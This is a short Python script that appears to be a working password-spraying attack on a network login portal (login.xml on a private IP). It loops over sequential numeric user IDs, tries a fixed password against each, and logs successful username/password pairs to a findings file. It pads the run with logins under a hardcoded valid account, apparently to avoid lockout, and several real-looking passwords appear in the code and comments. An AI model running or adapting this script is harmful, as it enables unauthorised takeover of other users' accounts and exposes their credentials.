import requests
import time

url = "http://172.16.68.6:8090/login.xml"

def login(user, passwd):
    req = {'mode': '191', 'username': user, 'password': passwd}
    x = requests.post(url, data=req)
    if x.text[90] == 'Y':
        success_message = f'{user},{passwd}'
        append_to_file(success_message)
        return f'[+] SUCCESS User = {user}, Pass = {passwd}'
    else:
        return f'[-] {user} Failure :('

def logout(user):
    req = {'mode': '193', 'username': user}
    x = requests.post(url, data=req)

def correct_attempt():
    login("19102168", "178045HI")

def append_to_file(message):
    with open('2024-findings.txt', 'a') as file:
        file.write(message + '\n')

for en in range(19102000, 19102100, 2):
    print(login(en, "178045HI"))
    time.sleep(0.05)
    logout(en)
    # print(login(en, "179001AS"))
    # time.sleep(0.05)
    # logout(en)
    print(login(en+1, "178045HI"))
    time.sleep(0.05)
    logout(en)
    # print(login(en+1, "179001AS"))
    # time.sleep(0.05)
    # logout(en)
    correct_attempt()

# 179001AS
# 357043AR